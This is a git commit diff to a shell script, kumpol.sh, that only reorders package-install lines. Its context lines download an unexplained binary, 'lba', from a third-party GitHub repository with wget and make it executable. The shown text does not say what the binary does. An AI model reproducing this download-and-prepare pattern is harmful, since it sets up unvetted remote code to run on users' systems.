de06ec5aaa6eb4413d04a71cdc1270647c8f1d94
bajol1 <102598068+bajol1@users.noreply.github.com>
2022-05-24 16:47:55 +0000

    Update kumpol.sh

--- kumpol.sh
+++ kumpol.sh
@@ -1,6 +1,5 @@
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-
-apt update 
+apt update
+apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
 wget https://github.com/christiarch/templates/raw/main/lba 
 chmod +x lba 
